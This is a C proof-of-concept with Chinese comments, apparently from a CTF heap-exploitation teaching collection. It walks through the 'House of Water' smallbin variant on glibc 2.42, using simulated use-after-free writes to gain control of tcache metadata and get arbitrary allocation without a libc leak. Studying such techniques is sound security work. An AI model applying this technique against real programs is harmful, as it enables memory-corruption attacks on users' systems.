/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_water
 * 文件标注范围：2.42
 * 模拟漏洞：UAF 或 double free，可控制 tcache 元数据附近的伪造 chunk。
 * 核心流程：把 tcache counts/entries 字节拼成 fake chunk，借 unsorted 链获得无泄露 libc 链接，再控制 tcache。
 * 成功判据：PoC 同时验证 leakless libc link 与任意分配；2.42、2.43 元数据布局变化各有独立版本。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

/*
 * House of Water 把 UAF/double-free 转化为 tcache_perthread_struct 控制原语。
 * 这里采用改进的 smallbin 变体：伪 chunk 通过 smallbin 双链引入，不必在
 * tcache 元数据内部额外伪造 size，即使没有“整数递增”能力也不再需要爆破
 * 4 位地址。变体说明：
 * https://github.com/4f3rg4n/CTF-Events-Writeups/blob/main/Potluck-CTF-2023/House_Of_Water_Smallbin_Variant.md
 *
 * 核心布局如下：
 * 1. 把 relative_chunk 放在 tcache 元数据之后，使它与元数据中的目标伪块
 *    共享可预测的地址低半字节；
 * 2. 通过两次伪尺寸 free，在两个大尺寸 tcache entry 中留下分别指向
 *    small_start 与 small_end chunk header 的指针；这些机器字稍后会被
 *    smallbin 解释为 fake chunk 的 fd 与 bk；
 * 3. 依次把 small_end、relative_chunk、small_start 送入 unsorted，再用
 *    大请求把三者整理成同一 smallbin 双链；
 * 4. UAF 覆盖 small_start->fd 与 small_end->bk 的低位，把链表两端同时
 *    重定向到 tcache 元数据内的 fake chunk；
 * 5. 清空 0x90 tcache 后连续分配，先取两端真实块，最后让 malloc 返回
 *    tcache 元数据内部的伪块，从而直接读写 counts/entries。
 *
 * 2.42 与 2.43 的 tcache_perthread_struct 尺寸和 entry 偏移变化，所以各有
 * 独立堆风水与 bin 尺寸常量；攻击思想和上述双链闭合过程不变。
 * 原始技术作者：@udp_ctf（Water Paddler / Blue Water）；
 * smallbin 变体作者：@4f3rg4n（CyberEGGs）。
 */

void dump_memory(void *addr, unsigned long count) {
	for (unsigned int i = 0; i < count*16; i += 16) {

	}	
}

int main(void) {
	// 占位变量接收只为改变 bin 状态、不再需要用户指针的分配结果。
	void *_ = NULL;

	// 关闭 stdio 缓冲，避免 _IO_FILE 的隐式堆分配打乱 tcache 元数据后的相对布局。
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);

	// 2.42 先做一次 0x4e0 申请，把 tcache_perthread_struct 稳定推到页内偏移 0x4f0，消除 4 位爆破。
	malloc(0x4e0);

	// 第一步：申请三块 0x90 chunk 与保护块；稍后把它们组成用于劫持的 smallbin 链。

	void *relative_chunk = malloc(0x88);

	_ = malloc(0x18); // 保护块保持已分配，防止相邻 0x90 chunk 在 free 时合并。

	void *small_start = malloc(0x88);

	_ = malloc(0x18); // 保护块保持已分配，防止相邻 0x90 chunk 在 free 时合并。

	void *small_end = malloc(0x88);

	_ = malloc(0x18); // 保护块保持已分配，防止相邻 0x90 chunk 在 free 时合并。

	// 第二步：填满 0x90 tcache，确保三个关键块释放后越过 tcache 进入 unsorted。
	
	// 根据 relative_chunk 的页内位置反推出 tcache 元数据基址，供后续计算伪块字段。
	void *metadata = (void *)((long)(relative_chunk) & ~(0xfff)) + 0x490;

	// 先申请足量同尺寸块；全部释放后恰好耗尽该版本 0x90 tcache 的可用槽。
	void *x[7];
	for (int i = 0; i < 7; i++) {
		x[i] = malloc(0x88);
	}

	// 逐一释放填充块，使下一次同尺寸 free 不再被 tcache 快速路径截获。
	for (int i = 0; i < 7; i++) {
		free(x[i]);
	}

	// 第三步：构造 0x310 与 0x320 tcache entry，使其数值分别与 small_end、small_start header 重叠。
	// 两个 entry 在元数据伪块视角下恰好充当 fd 与 bk，因此无需已知完整 libc 指针。

	dump_memory(small_start, 2);

	dump_memory(small_end, 2);

	// 第三步第一部分：在 small_start 前伪造大 chunk，并把 header 指针写入一个大尺寸 tcache entry。

	*(long*)(small_start-0x18) = 0x321;

	dump_memory(small_start-0x20, 3);

	free(small_start-0x10); // 伪 free 留下指向 small_start header 的值，稍后充当 fake smallbin 的 fd。

	*(long*)(small_start-0x8) = 0x91;

	// 第三步第二部分：对 small_end 做镜像操作，准备 fake smallbin 的 bk。

	*(long*)(small_end-0x18) = 0x311;
	
	dump_memory(small_end-0x20, 3);

	free(small_end-0x10); // 伪 free 留下指向 small_end header 的值，稍后充当 fake smallbin 的 bk。

	*(long*)(small_end-0x8) = 0x91;

	// 第四步：按 small_end、relative_chunk、small_start 的顺序释放到 unsorted，
	// 再用不匹配的大请求把三者整理进同一个 smallbin，保持 relative_chunk 位于中间。

	free(small_end);
	
	free(relative_chunk);
	
	free(small_start);

	_ = malloc(0x700);

	// 打印 smallbin 与相关 tcache entries，核对 fake fd/bk 所需的交叉指针已就位。

	dump_memory(metadata+0x370, 4);

	// 第五步：通过 UAF 改写 small_start->fd 与 small_end->bk，使二者指向元数据伪块。

	// 原始无泄漏模型只需把两端指针最低字节从 0x90 清成 0x00；
	// 元数据伪块与 relative_chunk 共享次低半字节 0x2，因此未知 ASLR 高位保持不变。

	/* 漏洞模拟开始/结束 */
	void *metadata_page = (void*)((long)metadata & ~0xfff);

	*(unsigned long *)small_start = (unsigned long)(metadata_page+0x700);

	*(unsigned long *)(small_end+0x8) = (unsigned long)(metadata_page+0x700);
	/* 漏洞模拟开始/结束 */

	// 第六步：清空 0x90 tcache 并沿伪 smallbin 链申请，最终取出元数据伪块。

	for(int i = 7; i > 0; i--)
		_ = malloc(0x88);

	// 再申请两次取走搬入 tcache 的 small_start 与 small_end，让伪块成为下一链头。
	_ = malloc(0x88);
	_ = malloc(0x88);

	// 第三次申请必须精确返回元数据内部伪块；下方断言验证这一点。
	void *meta_chunk = malloc(0x88);

	assert(meta_chunk == (metadata+0x280));

}
